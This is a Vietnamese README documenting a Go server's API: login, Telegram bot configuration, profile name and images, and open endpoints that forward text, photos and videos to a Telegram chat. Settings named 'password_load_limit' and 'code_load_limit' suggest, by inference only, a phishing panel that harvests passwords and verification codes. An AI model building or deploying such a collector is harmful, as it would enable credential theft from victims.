## Cài đặt

1. Clone repository:

~~~bash
git clone https://github.com/jack100cu100/mmmmm.git
cd mmmmm
~~~

2. Cài đặt dependencies:

~~~bash
go mod download
go mod tidy
~~~

## Build và Chạy

### Dev

~~~bash
go run main.go
~~~

### Build

~~~bash
# Linux/macOS
go build -o app main.go

# Windows
go build -o app.exe main.go
~~~

### Chạy bản build

~~~bash
# Linux/macOS
./app

# Windows
.\app.exe
~~~

API URL: <http://localhost:5000>

## API Documentation

### Authentication

#### Login

- **POST** `/api/login`
- **Description**: Đăng nhập và nhận JWT token
- **Request Body**:

~~~json
{
    "username": "string",
    "password": "string"
}
~~~

- **Response Success** (200):

~~~json
{
    "success": true,
    "message": "Đăng nhập thành công",
    "data": {
        "token": "eyJhbG...",
        "type": "Bearer"
    }
}
~~~

- **Response Error**:

  - **400 Bad Request**:

  ~~~json
  {
      "success": false,
      "message": "Dữ liệu không hợp lệ"
  }
  ~~~

  - **401 Unauthorized**:

  ~~~json
  {
      "success": false,
      "message": "Tài khoản hoặc mật khẩu không chính xác"
  }
  ~~~

  - **500 Internal Server Error**:

  ~~~json
  {
      "success": false,
      "message": "Lỗi tạo token"
  }
  ~~~

#### Verify Token

- **GET** `/api/verify`
- **Headers**: `Authorization: Bearer {token}`
- **Description**: Kiểm tra tính hợp lệ của token
- **Response Success** (200):

~~~json
{
    "success": true,
    "message": "Token hợp lệ",
    "data": {
        "username": "string"
    }
}
~~~

- **Response Error**:
  - **401 Unauthorized**:

  ~~~json
  {
      "success": false,
      "message": "Vui lòng đăng nhập"
  }
  ~~~

### Telegram Configuration

#### Get Telegram Config

- **GET** `/api/config/telegram`
- **Headers**: `Authorization: Bearer {token}`
- **Response Success** (200):

~~~json
{
    "success": true,
    "data": {
        "token": "string",
        "chat_id": "string"
    }
}
~~~

- **Response Error**:

  - **401 Unauthorized**:

  ~~~json
  {
      "success": false,
      "message": "Vui lòng đăng nhập"
  }
  ~~~

#### Update Telegram Config

- **POST** `/api/config/telegram`
- **Headers**: `Authorization: Bearer {token}`
- **Request Body**:

~~~json
{
    "token": "string",
    "chat_id": "string"
}
~~~

- **Response Success** (200):

~~~json
{
    "success": true,
    "message": "Đã cập nhật cấu hình telegram"
}
~~~

- **Response Error**:

  - **400 Bad Request**:

  ~~~json
  {
      "success": false,
      "message": "Dữ liệu không hợp lệ"
  }
  ~~~

  - **401 Unauthorized**:

  ~~~json
  {
      "success": false,
      "message": "Vui lòng đăng nhập"
  }
  ~~~

  - **500 Internal Server Error**:

  ~~~json
  {
      "success": false,
      "message": "Lỗi khi cập nhật cấu hình"
  }
  ~~~

### System Configuration

#### Get System Config

- **GET** `/api/config/system`
- **Description**: Lấy cấu hình hệ thống
- **Response Success** (200):

~~~json
{
    "success": true,
    "data": {
        "password_load_limit": 3,
        "password_load_duration": 300,
        "code_load_limit": 3,
        "code_load_duration": 300
    }
}
~~~

#### Update System Config

- **POST** `/api/config/system`
- **Headers**: `Authorization: Bearer {token}`
- **Request Body**:

~~~json
{
    "password_load_limit": 3,
    "password_load_duration": 300,
    "code_load_limit": 3,
    "code_load_duration": 300
}
~~~

- **Response Success** (200):

~~~json
{
    "success": true,
    "message": "Đã cập nhật cấu hình hệ thống"
}
~~~

### Auth Configuration

#### Update Auth Config

- **POST** `/api/config/auth`
- **Headers**: `Authorization: Bearer {token}`
- **Request Body**:

~~~json
{
    "username": "string",
    "password": "string"
}
~~~

- **Response Success** (200):

~~~json
{
    "success": true,
    "message": "Đã cập nhật thông tin đăng nhập"
}
~~~

### User Management

#### Get User Info

- **GET** `/api/user`
- **Description**: Lấy thông tin người dùng
- **Headers**: Không yêu cầu xác thực
- **Response Success** (200):

~~~json
{
    "success": true,
    "data": {
        "full_name": "string",
        "cover_image": "string",
        "avatar_image": "string"
    }
}
~~~

#### Update User Info

- **POST** `/api/user/info`
- **Headers**: `Authorization: Bearer {token}`
- **Description**: Cập nhật thông tin người dùng
- **Request Body**:

~~~json
{
    "full_name": "string"
}
~~~

- **Response Success** (200):

~~~json
{
    "success": true,
    "message": "Đã cập nhật thông tin thành công"
}
~~~

- **Response Error**:
  - **400 Bad Request**:

  ~~~json
  {
      "success": false,
      "message": "Dữ liệu không hợp lệ"
  }
  ~~~

  - **500 Internal Server Error**:

  ~~~json
  {
      "success": false,
      "message": "Lỗi khi cập nhật thông tin"
  }
  ~~~

#### Upload User Image

- **POST** `/api/user/upload`
- **Headers**: `Authorization: Bearer {token}`
- **Description**: Upload ảnh đại diện hoặc ảnh bìa
- **Query Parameters**:
  - `type`: "avatar" hoặc "cover"
- **Request Body**: `multipart/form-data`
  - `image`: File ảnh
- **Giới hạn**:
  - Định dạng: jpg, jpeg, png
  - Kích thước tối đa: 5MB

- **Response Success** (200):

~~~json
{
    "success": true,
    "message": "Tải lên ảnh thành công",
    "data": {
        "image_url": "string"
    }
}
~~~

- **Response Error**:
  - **400 Bad Request**:

  ~~~json
  {
      "success": false,
      "message": "Không tìm thấy file"
  }
  ~~~

  - **500 Internal Server Error**:

  ~~~json
  {
      "success": false,
      "message": "Lỗi khi lưu file"
  }
  ~~~

  ~~~json
  {
      "success": false,
      "message": "Lỗi khi cập nhật đường dẫn ảnh"
  }
  ~~~

### Gửi tin nhắn Telegram

- **POST** `/api/sendMessage`
- **Description**: Gửi tin nhắn qua Telegram bot
- **Request Body**:

~~~json
{
    "text": "string",
    "parse_mode": "HTML",
    "old_message_id": 123
}
~~~

- **Response Success** (200):

~~~json
{
    "success": true,
    "message": "Đã gửi tin nhắn thành công",
    "message_id": 124
}
~~~

- **Response Error**:

  - **400 Bad Request**:

  ~~~json
  {
      "success": false,
      "message": "Dữ liệu không hợp lệ"
  }
  ~~~

  - **500 Internal Server Error**:

  ~~~json
  {
      "success": false,
      "message": "Thiếu cấu hình Telegram"
  }
  ~~~

  ~~~json
  {
      "success": false,
      "message": "Lỗi khi gửi tin nhắn"
  }
  ~~~

### Gửi ảnh Telegram

- **POST** `/api/sendPhoto`
- **Description**: Gửi ảnh qua Telegram bot
- **Request Body**: `multipart/form-data`
  - `photo`: File ảnh (jpg, png, ...)
  - `message_id`: ID tin nhắn để reply (tùy chọn)

- **Response Success** (200):

~~~json
{
    "success": true,
    "message": "Đã gửi tin nhắn thành công",
    "message_id": 125
}
~~~

- **Response Error**:

  - **400 Bad Request**:

  ~~~json
  {
      "success": false,
      "message": "Không tìm thấy file ảnh"
  }
  ~~~

  ~~~json
  {
      "success": false,
      "message": "Kích thước file quá lớn (tối đa 10MB)"
  }
  ~~~

  ~~~json
  {
      "success": false,
      "message": "File không phải là ảnh"
  }
  ~~~

  - **500 Internal Server Error**:

  ~~~json
  {
      "success": false,
      "message": "Thiếu cấu hình Telegram"
  }
  ~~~

  ~~~json
  {
      "success": false,
      "message": "Lỗi khi đọc file"
  }
  ~~~

  ~~~json
  {
      "success": false,
      "message": "Lỗi khi gửi tin nhắn"
  }
  ~~~

### Gửi video Telegram

- **POST** `/api/sendVideo`
- **Description**: Gửi video qua Telegram bot
- **Request Body**: `multipart/form-data`
  - `video`: File video (mp4, webm)
  - `message_id`: ID tin nhắn để reply (tùy chọn)

- **Response Success** (200):

~~~json
{
    "success": true,
    "message": "Đã gửi tin nhắn thành công",
    "message_id": 126
}
~~~

- **Response Error**:

  - **400 Bad Request**:

  ~~~json
  {
      "success": false,
      "message": "Không tìm thấy file video"
  }
  ~~~

  ~~~json
  {
      "success": false,
      "message": "Kích thước file quá lớn (tối đa 50MB)"
  }
  ~~~

  ~~~json
  {
      "success": false,
      "message": "File không phải là video hỗ trợ (mp4 hoặc webm)"
  }
  ~~~

  - **500 Internal Server Error**:

  ~~~json
  {
      "success": false,
      "message": "Thiếu cấu hình Telegram"
  }
  ~~~

  ~~~json
  {
      "success": false,
      "message": "Lỗi khi đọc file"
  }
  ~~~

  ~~~json
  {
      "success": false,
      "message": "Lỗi khi gửi tin nhắn"
  }
  ~~~
